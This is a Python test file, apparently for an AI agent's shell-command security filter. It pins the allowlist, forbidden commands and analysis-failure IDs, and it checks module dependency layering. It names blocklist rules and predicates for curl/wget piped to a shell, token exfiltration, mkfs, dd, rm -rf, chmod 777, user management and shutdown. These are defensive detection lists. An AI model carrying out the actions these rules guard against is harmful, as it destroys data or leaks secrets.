    ("syntax:pipe_amp", "cat f |& grep x", {}),
    ("syntax:forbidden_command", "nohup sleep 1", {}),
    ("syntax:redirect", "echo a > /tmp/o", {}),
    ("syntax:heredoc", "cat <<EOF\nhi\nEOF", {}),
    ("syntax:herestring", "cat <<< hello", {}),
    ("syntax:brace_expansion", "echo {a,b}", {}),
    ("syntax:command_path", "foo..bar", {}),
    ("syntax:script_path", "bash /etc/s.sh", {}),
    ("ast:unsupported_parameter_execution", "echo ${x:-$(uname -a)}", {}),
    # 注：``review`` 不是规则，无 rule_id 可断言；其行为由零规则命中用例覆盖。
)

#: **分析失败**语料（它们是归因标识，不是规则）。与 ``_CORPUS`` 分表，
#: 使「规则集合缩小时覆盖静默缩水」不可能发生——两个表的覆盖各自被独立断言。
_FAILURE_CORPUS: tuple[tuple[str, str, dict], ...] = (
    ("parse:syntax_error", 'echo "unclosed', {}),
    ("parse:unsupported_syntax", "echo $((1+2))", {}),
    ("budget:max_nodes", "echo a && ls && uname -a", {"max_nodes": 3}),
    ("budget:max_depth", "echo a", {"max_depth": 1}),
    ("budget:max_command_length", "echo " + "A" * 9000, {}),
    ("budget:recursion", "echo " + "$(" * 200 + "a" + ")" * 200, {}),
    ("input:null_byte", "echo hello\0world", {}),
    ("empty:no_executable_command", "", {}),
    ("analysis:incomplete", "echo a && ls && uname -a", {"max_nodes": 3}),
)

#: 无法用单条命令直接触发、需特殊构造的分析失败 id（与上面的语料合起来覆盖 13 条）。
_FAILURE_SYNTHETIC: set[str] = frozenset(
    {
        "parse:internal_error",  # 需要 mock 出 AttributeError 且非纯注释
        "budget:max_reparse_depth",  # 需要嵌套脚本解码链超过再解析深度
        "rule:internal_error",  # 需要规则求值抛异常
        "ast:unknown_node",  # 需要未建模的 AST 节点（普通命令无法构造）
    }
)


class TestCorpusTriggersRegisteredRules:
    """语料里每条用例都应产出其声明的 rule_id（证明语料有效）。"""

    @pytest.mark.parametrize(
        ("rule_id", "command", "overrides"),
        _CORPUS,
        ids=[item[0] for item in _CORPUS],
    )
    def test_corpus_produces_declared_rule_id(self, rule_id, command, overrides):
        """规则语料必须真的触发目标 id，否则该语料对该 id 无证明力。"""
        assert rule_id in _rule_ids(command, **overrides)

    @pytest.mark.parametrize(
        ("rule_id", "command", "overrides"),
        _FAILURE_CORPUS,
        ids=[item[0] for item in _FAILURE_CORPUS],
    )
    def test_failure_corpus_produces_declared_id(self, rule_id, command, overrides):
        """分析失败语料同样必须真的触发目标 id。"""
        assert rule_id in _rule_ids(command, **overrides)

    def test_corpus_covers_every_registered_rule(self):
        """语料覆盖全部 29 条规则——注册表里没有「登记了但从不产出」的孤儿。

        **这是双向断言的一半**（规则侧）。必须与
        :meth:`test_corpus_covers_every_analysis_failure` 一起看：只断言「覆盖
        规则集合」时，规则集合缩到 29 会让断言**仍然通过**，而 13 条分析
        失败的覆盖证明力**静默消失**。
        """
        covered = {item[0] for item in _CORPUS}
        assert covered == set(RULE_SPECS), f"未被语料覆盖：{sorted(set(RULE_SPECS) - covered)}"

    def test_corpus_covers_every_analysis_failure(self):
        """语料覆盖全部 13 条分析失败路径——**双向断言的另一半**。

        13 条分析失败移出 ``RULE_SPECS`` 后，``test_corpus_covers_every_registered_rule``
        的 ``covered == set(RULE_SPECS)`` 会**自动变小且仍然通过**。若不补这条，
        这些失败路径就再无覆盖证明（它们的语料可被静默删除而无人察觉）。
        """
        covered = {item[0] for item in _FAILURE_CORPUS} | _FAILURE_SYNTHETIC
        assert covered == ANALYSIS_FAILURE_IDS, f"未被语料覆盖：{sorted(ANALYSIS_FAILURE_IDS - covered)}"

    def test_a_one_way_coverage_assertion_would_be_false_green(self):
        """**反例证明**：单向断言在「删掉 13 条失败语料」后仍会通过（即假绿）。

        这条把一个**负结果**写成可证伪的陈述：模拟「只有规则侧断言 + 失败语料被删」
        的状态，断言它**仍满足**单向判据——若它不满足，说明双向断言并非必要。
        """
        rules_only_covered = {item[0] for item in _CORPUS}  # 假设失败语料被删
        assert rules_only_covered == set(RULE_SPECS)  # 单向判据仍然为真 = 假绿
        # 而正确的双向判据会因失败侧缺 13 条而变红：
        assert rules_only_covered != ANALYSIS_FAILURE_IDS


class TestDangerousCategories:
    """``BLOCKLIST_CATEGORIES`` 是拒绝文案归因的判据，必须与危险标签的类别一致。

    它在 ``command_blocklist`` 里以字面量列出（保持依赖叶子，不 import dangerous_patterns），
    故需要这条测试防止两处漂移。
    """

    def test_matches_label_categories_exactly(self):
        """``BLOCKLIST_CATEGORIES`` 与 14 条危险规则的 ``category`` 取值集合完全相同。"""
        assert {spec.category for spec in BLOCKLIST_RULES} == BLOCKLIST_CATEGORIES

    def test_every_dangerous_label_category_is_covered(self):
        """每个危险规则的 category 都在集合内（无一遗漏）。"""
        missing = {spec.category for spec in BLOCKLIST_RULES if spec.category not in BLOCKLIST_CATEGORIES}
        assert missing == set()

    @pytest.mark.parametrize(
        "category",
        [
            "syntax",
            "parse",
            "budget",
            "invocation",
            "input",
            "empty",
            "rule",
            "analysis",
            "arguments",
            "ast",
            "allowlist",
            "dynamic",
            None,
        ],
    )
    def test_non_dangerous_categories_excluded(self, category):
        """结构约束 / 分析失败 / 参数限制 / 兜底待遇都不是「危险命令」。"""
        assert category not in BLOCKLIST_CATEGORIES

    def test_every_registry_spec_category_is_classified(self):
        """注册表里出现的每个 category 要么是危险类、要么不在危险类（无未定义值）。"""
        seen = {spec.category for spec in RULE_SPECS.values()}
        assert seen  # 非空
        # 危险类必须完全落在注册表已用的 category 集合内
        assert seen >= BLOCKLIST_CATEGORIES


class TestContentMigration:
    """注册表内容与实现实际使用的一致。

    风险是「双真源」：注册表存一份、实现里又留一份手写副本，二者漂移。
    本类用「注册表内容 == 派生视图」的等式把漂移变成红灯。

    ⚠ 本类守的是**等式**（防双真源），对「内容值本身被静默改动」无效——注册表与
    派生视图是同一个对象时等式恒成立。内容值由 :class:`TestContentValuesArePinned`
    独立钉住。
    """

    def test_allowlist_view_matches_registry(self):
        """``command_allowlist.ALLOWED_COMMANDS`` 是从注册表派生的只读视图。"""
        assert ALLOWED_COMMANDS == ALLOWLIST_COMMANDS
        assert _names_of(RULE_SPECS["allowlist:allowed"].pattern) == ALLOWLIST_COMMANDS

    def test_allowlist_groups_partition_is_consistent(self):
        """允许列表分组名互不重叠，且并集等于全集（无遗漏/无重复归属）。"""
        groups = ALLOWLIST_GROUPS
        total = sum(len(v) for v in groups.values())
        assert total == len(ALLOWLIST_COMMANDS), "分组间存在重复命令名"

    def test_forbidden_commands_view_matches_registry(self):
        """``command_definitions.FORBIDDEN_COMMANDS`` 派生自注册表内容。"""
        assert _names_of(RULE_SPECS["syntax:forbidden_command"].pattern) == cd.FORBIDDEN_COMMANDS

    @pytest.mark.parametrize(
        ("label", "expected"),
        [
            ("shutdown_reboot", {"halt", "poweroff", "reboot", "shutdown"}),
            ("user_management", {"adduser", "passwd", "useradd", "usermod", "visudo"}),
        ],
    )
    def test_dangerous_name_sets(self, label, expected):
        """``shutdown_reboot`` / ``user_management`` 的命令名集合（钉住实际名录）。

        名字集合不再有并行常量副本——唯一归属地是规则自身的 ``pattern``。
        本断言因此钉住**名录本身**：改名会被红灯拦下，而非静默扩大/收窄命中面。

        与 :class:`TestContentValuesArePinned::test_dangerous_name_sets_are_pinned`
        **刻意保留两处**：前者是「注册表 == 派生视图」等式，后者钉「内容值本身」，
        互补不重复。
        """
        assert _names_of(RULE_SPECS[label].pattern) == expected

    def test_firewall_names_match_their_literal_constant(self):
        """``firewall_change`` 的名字集既是字面量常量、又是 ``pattern`` 的取数来源。

        名字集合由 ``requires_any_flag`` 承载，「存在任意 ``-`` 参数」是
        ``Pattern.requires_any_flag``。判据是「``_FIREWALL`` 仍然是名字的归属地，
        且 pattern 里的名字集合与它一致」——「常量 == pattern 派生视图」的等式
        把两处漂移变成红灯。
        """

        pattern = RULE_SPECS["firewall_change"].pattern
        assert {"iptables", "ufw"} == cdb._FIREWALL
        assert pattern is not None
        assert pattern.requires_any_flag is True
        assert _names_of(pattern) == cdb._FIREWALL

    def test_every_dangerous_label_declares_a_dispatch_path(self):
        """14 条危险标签都登记了判定路径（谓词）——「登记了但永不生效」的防线。

        可字面化的用 ``pattern``，不可字面化的用 ``predicate``。二者必居其一
        （``_predicate_for`` 的导入期自检保证），故此处断言的是「每条都有谓词」。
        """
        missing = [label for label in BLOCKLIST_RULE_IDS if RULE_SPECS[label].predicate is None]
        assert missing == []

    def test_dangerous_predicates_read_their_own_spec_from_context(self):
        """危险规则谓词的**身份来自 ``context.spec``**，既不查全局表、也不靠预绑定常量。

        谓词的身份必须来自 ``context.spec``：若靠 ``label -> spec`` 的模块级全局表反查，
        就构成 ``命中 → 全局表 → BLOCKLIST_RULES → 谓词 → 命中`` 的**定义期循环**，
        任何在构造期触发谓词的改动都会炸成 NameError。故谓词自知其 spec：派发层已把本轮
        spec 注入 ``RuleContext.spec``，谓词直接读它即可（与 ``command_allowlist`` /
        ``command_parser`` 的既有惯例一致）。

        本断言同时守两侧：
        1. **反向**：谓词体不得出现任何模块级 ``label -> spec`` 映射名（防环回归）；
        2. **正向**：每个谓词都必须真正消费 ``context.spec``（防有人改回"预绑定常量"
           那种绕开上下文的形态）。
        """
        module = ast.parse((_COMMAND_DIR / "command_blocklist.py").read_text(encoding="utf-8"))

        # 模块级「label -> spec」映射名（当前已无；若新增，须同时更新本表）。
        global_lookup_names = {"_SPEC_BY_LABEL", "SPEC_BY_LABEL"}
        predicate_names = {
            "_danger_mkfs",
            "_danger_pip_package_install",
            "_danger_dd",
            "_danger_exfil_curl_token",
            "_danger_python_module_package_install",
            "_danger_curl_pipe_shell",
            "_danger_wget_pipe_shell",
        }
        predicates = {
            node.name: node
            for node in ast.walk(module)
            if isinstance(node, ast.FunctionDef) and node.name in predicate_names
        }
        assert set(predicates) == predicate_names, f"谓词清单漂移：{sorted(predicates)}"

        offenders = [
            (name, sub.id, sub.lineno)
            for name, node in predicates.items()
            for sub in ast.walk(node)
            if isinstance(sub, ast.Name) and sub.id in global_lookup_names
        ]
        assert offenders == [], f"谓词体引用了全局 spec 表（会构成定义期循环）：{offenders}"

        # 正向：谓词须把 context 传给身份感知的命中构造（或直接/间接读 context.spec）。
        # ``_danger_*_pipe_shell`` 是薄转发，实际读 spec 的是它们调用的 ``_pipeline_hits``。
        DELEGATING = {"_danger_curl_pipe_shell", "_danger_wget_pipe_shell"}
        helper = next(
            node for node in ast.walk(module) if isinstance(node, ast.FunctionDef) and node.name == "_pipeline_hits"
        )
        assert any(isinstance(s, ast.Attribute) and s.attr == "spec" for s in ast.walk(helper)), (
            "_pipeline_hits 应从 context.spec 读自己的身份"
        )
        utilises_spec = {
            name
            for name, node in predicates.items()
            if any(isinstance(sub, ast.Attribute) and sub.attr == "spec" for sub in ast.walk(node))
        } | DELEGATING
        assert utilises_spec == predicate_names, (
            f"这些谓词没有从 context.spec 读自己的身份：{sorted(predicate_names - utilises_spec)}"
        )

    def test_literalizable_rules_have_a_pattern(self):
        """可下发的危险规则（``literalizable``）确实带 pattern——准入判据的可证伪面。

        名单为 9 条：纯命令名集合类（``rm_forbidden`` / ``shutdown_reboot`` /
        ``user_management`` / ``shred_file``）与「名字 + 操作数」类
        （``rm_recursive_force`` / ``chmod_777`` / ``chown_root`` /
        ``package_install`` / ``firewall_change``）。
        **``mkfs_format`` 不在内**：它需要 ``mkfs(\\..+)?$`` 的正则与特殊名 ``format``，
        引入命令名前缀族会成第二套名字匹配语义。
        """
        literalizable = [s for s in RULE_SPECS.values() if s.rule_id in BLOCKLIST_RULE_IDS and s.literalizable]
        assert {s.rule_id for s in literalizable} == {
            "shutdown_reboot",
            "user_management",
            "shred_file",
            "rm_recursive_force",
            "rm_forbidden",
            "chmod_777",
            "chown_root",
            "package_install",
            "firewall_change",
        }


# 本段守双向边界：
#
# - **方向 1（基础定义不依赖数据）**：基础定义模块（``command_definitions``）不得 import
#   数据模块。它的实质约束由 ``test_base_module_does_not_import_data_modules`` 断言。
# - **方向 2（数据模块只能取类型、不得取机制）**：类型（``RuleSpec``）与机制
#   （``build_rule_set``）同处一个模块，故「import 了哪个
#   模块」不能区分意图——必须断言**导入的名字**。这正是下面各条的做法。
#
# 为什么必须用 ast 而不是 grep 文本：模块文档字符串里**合法地**提到这些名字
# （散文、交叉引用），grep 会把它们当成违规。ast 只看真实的 import 语句，
# 并天然处理多行括号式 import。

#: 基础定义模块名。
_BASE_MODULE = "command_definitions"

#: 规则**导入期自检**的集中模块（样例自洽 / 占位符一致性 / 全集不变量）。
#: 它是 ``command_definitions`` 与数据模块的下游旁支，**不得** import 聚合点。
_VALIDATION_MODULE = "command_rule_validation"

#: 数据模块可以从基础定义模块拿的**允许集**（词汇 + 身份层判据）。
#:
#: 类型与机制同处一个模块，无法用「import 了哪个模块」区分意图，故**显式枚举
#: 允许的词汇**：
#:
#: - 身份/类型：``RuleSpec``（规则身份）、``Pattern``（内容形状）、``RuleHit`` /
#:   ``RuleContext`` / ``RulePredicate`` / ``RuleResolver``（谓词词汇）、``CommandSource`` /
#:   ``CommandStructureFinding``（结果契约）、``AnalysisFailure``（归因标识）；
#: - 纯函数/工厂：``data_predicate_for``、
#:   ``names``（alternatives token 构造）；
#: - 文案：``JUSTIFICATION_TEMPLATES``（需填充的 ``justification`` 模板）、
#:   ``render_justification``（按模板渲染）、``ensure_template_params_filled``
#:   （运行时守卫：填充键须覆盖声明）——数据模块各持有自己那几条规则的判定，
#:   判定命中时要产出文案，故取用这三项是本职，不是边界违规。
#:
#: **不在允许集里的一律违规**——真正要挡的是**机制**：
#:
#: - ``build_rule_set`` —— 把平台声明编译成生效规则集，是编排层
#:   （``command_security``）的职责；数据模块需要它，说明职责已串味。
#: - ``RuleConfigError`` —— 机制的失败类型，数据模块不做配置校验。
#: - ``load_time_self_test`` / ``assert_justification_templates_are_consistent`` ——
#:   导入期自检，已迁至 ``command_rule_validation``；数据模块不消费它们（只由聚合点调）。
#:
#: 允许列表式（而非黑名单式）是刻意的：新增机制函数时若忘了登记，它会**默认被拒**，
#: 逼调用方来本表显式说明「为什么数据模块需要它」。
_DATA_MODULE_ALLOWED_FROM_BASE = frozenset(
    {
        # 身份与类型
        "AnalysisFailure",
        "CommandSource",
        "CommandStructureFinding",
        "Pattern",
        "RuleContext",
        "RuleHit",
        "RulePredicate",
        "RuleResolver",
        "RuleSpec",
        # 纯函数与工厂
        "data_predicate_for",
        "names",
        # 文案（规则命中时产出 justification）
        "FORBIDDEN_COMMANDS",
        "JUSTIFICATION_PARAMS",
        "JUSTIFICATION_TEMPLATES",
        "ensure_template_params_filled",
        "render_justification",
    }
)

#: 数据模块（规则**数据**的生产者）。依赖方向上必须是基础定义模块的下游，
#: 只能从中取类型与词汇，不得取机制。
#:
#: 文案模块已并入 ``command_definitions``（文案与类型同处基础定义模块），故不再单列。
_DATA_MODULES = (
    "command_allowlist",
    "command_blocklist",
    "command_parser",
    "command_syntax_rules",
)

#: ``command_security`` 是**聚合点**，刻意豁免：它按设计要 import ``build_rule_set``
#: 与 ``RuleSet``（把声明编译成生效规则集）。把它纳入方向 2 的断言会把
#: 「职责分离」误判成「边界违规」。
_AGGREGATION_MODULE = "command_security"


def _parse_module(name: str) -> ast.Module:
    """解析 ``command`` 包内的一个模块。"""
    return ast.parse((_COMMAND_DIR / f"{name}.py").read_text(encoding="utf-8"))


def _imports_from_module(tree: ast.Module, target: str, *, top_level_only: bool) -> set[str]:
    """收集「从 ``target`` 导入的名字」，只看真实 import 语句。

    Args:
        tree: 已解析的模块 AST。
        target: 包内模块名（如 ``command_definitions``）；匹配 ``from .command_definitions import ...``
            与 ``from aidev_agent...command.command_definitions import ...`` 两种写法。
        top_level_only: 为真时只扫描模块体（忽略函数内延迟 import）。
    """
    nodes = tree.body if top_level_only else list(ast.walk(tree))
    found: set[str] = set()
    for node in nodes:
        if not isinstance(node, ast.ImportFrom):
            continue
        # ``.command_definitions`` / ``command_definitions`` / 绝对路径末尾同名，都按末段匹配。
        if (node.module or "").split(".")[-1] != target:
            continue
        found.update(alias.name for alias in node.names)
    return found


def _sibling_imports(tree: ast.Module) -> set[str]:
    """**任何层级**（含函数内延迟）指向 ``command`` 包内兄弟模块的 import 目标。

    按「目标是否真的存在于本目录」判定，这样 ``from ....pydantic_models import ...``
    这类**父包**依赖不会混进来（它末段与兄弟模块同名与否无关，且本就不在边界内）。
    """
    siblings = {p.stem for p in _COMMAND_DIR.glob("*.py")}
    targets: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.ImportFrom) and node.level >= 1:
            last = (node.module or "").split(".")[-1]
            if last in siblings:
                targets.add(last)
    return targets


class TestDependencyBoundaryIsTwoWay:
    """依赖边界必须**双向**守着——只查一个方向等于没查。

    本结构的意义是把「类型/机制」与「规则数据」拆开，使数据模块成为注册表
    的下游。任何**一个**方向的越界都会让这个结构退化：

    - 方向 1（基础定义 → 数据模块）：基础定义重新 import 具体规则数据，成环，
      且「谁拥有规则」重新变成两处；
    - 方向 2（数据模块 → 基础定义的机制/数据）：数据模块为了拿到生效机制或全集
      而反向伸手，同样成环，且职责串味。

    两个方向都必须是**可证伪**的：各自注入一次越界 import 都会变红。
    """

    def test_base_module_does_not_import_data_modules(self):
        """方向 1：基础定义模块**不得** import 规则数据模块。

        本模块在任何层级都不得 import 四个数据模块（基础定义是数据模块的上游，
        反向依赖会成环）。

        可证伪：在 ``command_definitions.py`` 顶部加
        ``from .command_allowlist import ALLOWED_COMMANDS`` 即变红。
        """
        forbidden = _sibling_imports(_parse_module(_BASE_MODULE)) & set(_DATA_MODULES)
        assert not forbidden, (
            f"{_BASE_MODULE} import 了数据模块：{sorted(forbidden)}——基础定义模块是数据模块的**上游**，反向依赖会成环。"
        )

    def test_base_module_sibling_deps_are_only_deferred_aggregation(self):
        """基础定义模块**不应**依赖任何兄弟模块。

        基础定义模块是依赖叶子：它只提供类型与词汇，全集装配与配置校验归聚合层
        ``command_security``。曾经的延迟组合点（加载期校验钩子）已删除，故任何兄弟
        依赖的出现都意味着职责重新串味。**空集是精确断言**——出现任何一项都会红。
        """
        deps = _sibling_imports(_parse_module(_BASE_MODULE))
        assert deps == set(), f"{_BASE_MODULE} 不应有任何兄弟模块依赖（钩子已删除），实际 {sorted(deps)}"

    @pytest.mark.parametrize("module_name", _DATA_MODULES)
    def test_data_module_imports_only_types_from_registry(self, module_name):
        """方向 2：数据模块从基础定义模块拿的**只能是类型**。

        类型与机制同处一个模块，import 语句不再能区分意图，只能看**名字**。

        可证伪：在 ``command_allowlist.py`` 加
        ``from .command_definitions import build_rule_set`` 即变红。

        为什么这是违规：数据模块只需要 ``RuleSpec`` 这个形状来说明「我的规则长这样」。
        需要 ``build_rule_set`` 意味着它在自己编译平台声明
        （那是编排层职责）；需要 ``RuleConfigError`` 意味着它在做配置校验（同上）；
        需要 ``RULE_SPECS``（假想全集）意味着它在做聚合——那会立刻重建
        基础定义 → 数据模块 → 基础定义 的环，正是本结构拆掉的东西。
        """
        tree = _parse_module(module_name)
        names = _imports_from_module(tree, _BASE_MODULE, top_level_only=False)
        surplus = names - _DATA_MODULE_ALLOWED_FROM_BASE
        assert not surplus, (
            f"{module_name} 从 {_BASE_MODULE} 导入了非类型名字：{sorted(surplus)}；"
            f"只允许 {sorted(_DATA_MODULE_ALLOWED_FROM_BASE)}（类型）。"
            f"机制/数据（build_rule_set / RuleConfigError / RULE_SPECS）"
            f"归编排层，数据模块取用即边界违规。"
        )

    def test_data_modules_actually_use_the_type(self):
        """反向哨兵：上一条若因「压根没 import」而恒真，就假绿了。

        三个**规则产出方**数据模块（``command_allowlist`` / ``command_blocklist`` /
        ``command_syntax_rules``）**都**应 import ``RuleSpec``——它们各自导出 ``*_RULES``。
        ``command_blocklist`` 只需 ``RuleSpec`` 与 ``Pattern`` / ``names``。

        ``command_parser`` 只提供遍历 / 词法 / 名字解析口径，不 import ``RuleSpec``
        ——见下一条 :meth:`test_parser_exports_no_rules`。
        """
        producers = ("command_allowlist", "command_blocklist", "command_syntax_rules")
        for module_name in producers:
            names = _imports_from_module(_parse_module(module_name), _BASE_MODULE, top_level_only=False)
            assert "RuleSpec" in names, f"{module_name} 未 import RuleSpec（它应声明自己的 *_RULES）"
            assert names <= _DATA_MODULE_ALLOWED_FROM_BASE, (
                f"{module_name} 对 {_BASE_MODULE} 的导入是 {sorted(names)}，"
                f"超出允许集 {sorted(_DATA_MODULE_ALLOWED_FROM_BASE)}"
            )

    def test_parser_exports_no_rules(self):
        """``command_parser`` 不导出任何规则。

        反向护栏：若有人把规则数据搬回解析层，本条变红。
        断言两向——(1) 模块不自带 ``*_RULES`` 常量；(2) 源码内不出现 rule_id 字面量。
        """

        exported = {name for name in vars(cp_mod) if name.endswith("_RULES")}
        assert exported == set(), f"command_parser 不应再导出规则集：{sorted(exported)}"

        # 源码级字面量扫描：解析层不得再内联 syntax:/ast: 规则 id。
        source = (_COMMAND_DIR / "command_parser.py").read_text(encoding="utf-8")
        literals = {
            node.value
            for node in ast.walk(ast.parse(source))
            if isinstance(node, ast.Constant) and isinstance(node.value, str) and _RULE_ID_RE.fullmatch(node.value)
        }
        assert literals == set(), f"command_parser 源码内出现 rule_id 字面量：{sorted(literals)}"

    def test_aggregation_module_is_the_only_machinery_consumer(self):
        """聚合点 ``command_security`` 按设计消费机制——此处把它显式登记。

        不是豁免清单的「悄悄放行」，而是把「谁是聚合点」写成断言：它**必须**
        拿到 ``build_rule_set``，否则没人能把全集施加到配置上。
        它若**失去**这个 import，说明聚合职责被搬走了（本重构的另一种退化）。
        """
        names = _imports_from_module(_parse_module(_AGGREGATION_MODULE), _BASE_MODULE, top_level_only=False)
        assert "build_rule_set" in names, (
            f"{_AGGREGATION_MODULE} 应作为聚合点 import build_rule_set，实际：{sorted(names)}"
        )
        assert "RuleSpec" in names

    def test_no_deferred_import_to_bypass_layering(self):
        """数据模块**不得**用函数内延迟 import 反向引用其他数据模块来绕过分层。

        延迟 import 只是**绕过**环，不是消除环——数据模块之间应保持单向的模块级依赖。

        唯一允许的延迟 import 是 ``command_definitions`` 的组合点（它把
        ``command_security`` 的全集注入 pydantic 挂点，属刻意的晚绑定），故豁免。
        """
        allowed = {("command_definitions", "command_security")}
        offenders = []
        for name in _DATA_MODULES:
            module = _parse_module(name)
            for node in ast.walk(module):
                if not isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                    continue
                for sub in ast.walk(node):
                    if (
                        isinstance(sub, ast.ImportFrom)
                        and sub.level == 1
                        and sub.module
                        and (name, sub.module) not in allowed
                    ):
                        offenders.append((name, sub.module, sub.lineno))
        assert offenders == [], f"数据模块用延迟 import 绕过分层：{offenders}"

    def test_rule_validation_module_does_not_import_aggregation(self):
        """规则自检模块**不得** import 聚合点 ``command_security``（会成环）。

        规则自检模块（``command_rule_validation``）是「导入期自检」的集中地，全集靠
        **注入**（``assert_rule_invariants(specs, ...)``）——若它反向 import
        ``command_security`` 去取 ``RULE_SPECS``，就重建了「聚合点 → 自检 → 聚合点」的环。

        可证伪：在 ``command_rule_validation.py`` 顶部加
        ``from .command_security import RULE_SPECS`` 即变红。
        """
        targets = _sibling_imports(_parse_module(_VALIDATION_MODULE))
        assert _AGGREGATION_MODULE not in targets, (
            f"{_VALIDATION_MODULE} import 了 {_AGGREGATION_MODULE}——自检模块是聚合点的下游旁支，"
            f"反向依赖会成环；全集应由调用方注入。"
        )

    def test_rule_validation_imports_only_leaf_vocabulary(self):
        """规则自检模块从叶子 ``command_definitions`` 拿的**只能是类型与文案词汇**。

        它读 ``RuleSpec``（类型）、``JUSTIFICATION_PARAMS``（文案登记）——均属合法。
        不得取机制（``build_rule_set`` 等），否则与数据模块同等越界。
        """
        names = _imports_from_module(_parse_module(_VALIDATION_MODULE), _BASE_MODULE, top_level_only=False)
        surplus = names - _DATA_MODULE_ALLOWED_FROM_BASE
        assert not surplus, (
            f"{_VALIDATION_MODULE} 从 {_BASE_MODULE} 导入了非类型/文案名字：{sorted(surplus)}；"
            f"只允许 {sorted(_DATA_MODULE_ALLOWED_FROM_BASE)}。"
        )
        assert "RuleSpec" in names, f"{_VALIDATION_MODULE} 应 import RuleSpec（作签名类型标注）"


class TestDefinitionOrder:
    """``command_blocklist`` 的函数**自底向上**排列：被调用者先于调用者定义。

    这不是风格洁癖：函数体只在**调用期**解析全局名，故「先引用后定义」能跑，
    但会在 import 期留下隐式时序假设——一旦有人加构造期自测 / 调整模块结构，
    就炸成 NameError。强制「引用只指向已定义者」让依赖链单向可追溯。

    本类描述的是 ``command_blocklist.py`` 的函数顺序；类名不得改名（
    ``command_definitions.py`` 的 docstring 交叉引用了它）。
    """

    def test_no_forward_references(self):
        """任何顶层函数都不得引用**在其之后**定义的顶层函数。"""
        module = ast.parse((_COMMAND_DIR / "command_blocklist.py").read_text(encoding="utf-8"))
        lineno = {n.name: n.lineno for n in module.body if isinstance(n, ast.FunctionDef)}
        defined = set(lineno)

        offenders = []
        for node in module.body:
            if not isinstance(node, ast.FunctionDef):
                continue
            for sub in ast.walk(node):
                if (
                    isinstance(sub, ast.Name)
                    and isinstance(sub.ctx, ast.Load)
                    and sub.id in defined
                    and sub.id != node.name
                    and lineno[sub.id] > node.lineno
                ):
                    offenders.append((node.name, sub.id))
        assert offenders == [], f"存在「先引用后定义」的函数：{offenders}"

    def test_no_duplicate_definitions(self):
        """同名顶层函数只定义一次（重排时的复制粘贴防线）。"""
        module = ast.parse((_COMMAND_DIR / "command_blocklist.py").read_text(encoding="utf-8"))
        names = [n.name for n in module.body if isinstance(n, ast.FunctionDef)]
        dupes = sorted({n for n in names if names.count(n) > 1})
        assert dupes == [], f"重复定义的函数：{dupes}"


class TestContentValuesArePinned:
    """**内容值本身**必须被钉住。

    内容集迁移进注册表后，注册表成为唯一真源：改它一处，行为处处随之改变。这消除了
    双真源漂移，但也**移除了原有的散落副本所构成的隐式交叉校验** —— 实测确认：
    把 `shutdown_reboot` 的命令名从 {shutdown,reboot,poweroff,halt} 改成少一个 `halt`，
    整套测试**全绿**，而 `halt` 已从 block 静默降级为 review。

    防漂移测试（`TestContentMigration`）对此无效：注册表与派生视图是同一个对象，
    等式恒成立。故必须**独立钉住内容值**——两类测试是互补的，不是重复的。
    """

    @pytest.mark.parametrize(
        ("label", "expected"),
        [
            ("shutdown_reboot", {"shutdown", "reboot", "poweroff", "halt"}),
            ("user_management", {"useradd", "adduser", "usermod", "passwd", "visudo"}),
            ("shred_file", {"shred"}),
        ],
    )
    def test_dangerous_name_sets_are_pinned(self, label, expected):
        """危险规则的命令名集是安全契约，改动必须显式改这条测试。

        ``firewall_change`` **不在此表**：其名字集合由 ``_FIREWALL`` 常量承载，
        见 ``test_firewall_names_are_literalized_with_any_flag_semantics``。
        """
        assert _names_of(RULE_SPECS[label].pattern) == expected

    def test_forbidden_command_set_is_pinned(self):
        """无条件禁用命令集是安全契约。"""
        assert _names_of(RULE_SPECS["syntax:forbidden_command"].pattern) == {
            "nohup",
            "setsid",
            "disown",
            "screen",
            "tmux",
        }

    def test_allowlist_content_is_pinned(self):
        """允许列表内容被钉住：增删命令必须显式改这条测试。"""
        expected = {
            "pwd",
            "date",
            "hostname",
            "whoami",
            "id",
            "uptime",
            "uname",
            "free",
            "df",
            "ls",
            "dir",
            "cd",
            "stat",
            "readlink",
            "file",
            "df",
            "cp",
            "mv",
            "mkdir",
            "cat",
            "head",
            "tail",
            "grep",
            "egrep",
            "wc",
            "sort",
            "uniq",
            "cut",
            "tr",
            "awk",
            "sed",
            "diff",
            "echo",
            "printf",
            "true",
            "false",
            "sleep",
            "clear",
            "reset",
            "tar",
            "gzip",
            "zip",
            "bash",
            "sh",
            "zsh",
            "python",
            "python3",
        }
        assert expected == ALLOWLIST_COMMANDS
        assert len(expected) == 46

    @pytest.mark.parametrize(
        ("label", "command", "flags"),
        [
            ("rm_recursive_force", "rm", {"-rf", "-fr"}),
        ],
    )
    def test_flag_conditions_are_pinned(self, label, command, flags):
        """命令+flag 类规则的条件被钉住。"""
        pattern = RULE_SPECS[label].pattern
        assert pattern.tokens[0] == command
        assert set(pattern.tokens[1]) == flags

    @pytest.mark.parametrize(
        ("label", "command", "equals", "strip_colon"),
        [
            ("chmod_777", "chmod", {"777"}, False),
            ("chown_root", "chown", {"root"}, True),
        ],
    )
    def test_positional_conditions_are_pinned(self, label, command, equals, strip_colon):
        """命令+位置参数类规则的条件被钉住（含 chown 的冒号剥离）。"""
        pattern = RULE_SPECS[label].pattern
        assert pattern.tokens == (command,)
        assert pattern.positional_index == 0
        assert set(pattern.positional_equals) == equals
        assert pattern.strip_colon is strip_colon

    def test_firewall_names_are_literalized_with_any_flag_semantics(self):
        """``firewall_change`` 的名字集 + ``requires_any_flag``。

        「存在任意 ``-`` 参数」是 ``command_and_flags`` 的**放宽变体**——它仍在
        token 序列模型内，故可下发（``literalizable`` 为真）。名字仍是数据
        （``_FIREWALL``），只是判定条件由 ``Pattern`` 承载。
        """

        pattern = RULE_SPECS["firewall_change"].pattern
        assert pattern is not None
        assert pattern.requires_any_flag is True
        assert _names_of(pattern) == cdb._FIREWALL
        assert RULE_SPECS["firewall_change"].literalizable is True

    def test_mkfs_stays_code_predicate_and_is_not_literalizable(self):
        """``mkfs_format`` **不字面化**。

        理由：``mkfs(\\..+)?$`` 是**命令名前缀族**，引入它会造出第二套命令名匹配
        语义，与「名字由调用方传入、谓词只做精确相等」的唯一真源冲突。
        故它保持代码谓词、``pattern=None``、不进下发通道。
        """
        assert RULE_SPECS["mkfs_format"].pattern is None
        assert RULE_SPECS["mkfs_format"].literalizable is False

    @pytest.mark.parametrize("command", ["halt", "poweroff", "shutdown", "reboot"])
